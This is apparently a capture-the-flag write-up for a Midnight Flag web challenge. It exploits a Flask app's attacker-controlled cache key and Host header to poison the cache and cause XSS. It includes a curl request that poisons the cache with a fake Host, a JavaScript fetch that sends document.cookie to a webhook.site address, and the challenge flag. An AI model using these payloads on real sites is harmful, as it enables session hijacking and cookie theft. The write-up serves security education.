Solve
There is a cache poisoning and an xss on the host header due to these lines : 
@cache.cached(timeout=60, make_cache_key=make_key)
<script src="http://{request.headers.get('Host')}/script/main.js"></script>

If we take a look at the make_key function :

def make_key():
    cachekey = request.args.get("cachekey")
    return cachekey if cachekey else ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))


So we have to use a GET parameter cachekey to make our self xss exploitable.

Send this curl request to change the host where the script is loaded and use a custom cache key for cache poisoning :

$ curl "http://challenge.midnightflag.fr:10110/?cachekey=worty" -H "Host: attacker.fr"


On the server, host the following script at /script/main.js:

fetch("https://webhook.site/[UUID]/?data="+btoa(document.cookie));

Flag
MCTF{c4ch3_p0is0ning_t0_xss}
